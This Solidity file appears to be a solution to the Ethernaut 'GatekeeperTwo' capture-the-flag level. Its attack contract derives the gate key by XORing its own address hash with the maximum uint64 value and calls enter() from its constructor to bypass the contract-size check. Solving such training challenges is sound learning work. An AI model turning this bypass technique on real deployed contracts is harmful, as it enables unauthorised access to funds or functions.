pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
    function check() external;
}

contract GatekeeperTwoAttack {

    IGatekeeperTwo gateKeeperTwo;

    constructor(address addr) {
        console.log('msg.sender deployer of GTA', msg.sender);
        gateKeeperTwo = IGatekeeperTwo(addr);

        uint64 a = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        // uint64 b =  uint64(_gateKey);
        uint64 c = (2**64) - 1; //type(uint64).max;

        uint64 b = a ^ c; // = b

        bytes8 _gateKey = bytes8(b);

        gateKeeperTwo.enter(bytes8(_gateKey));
    }
}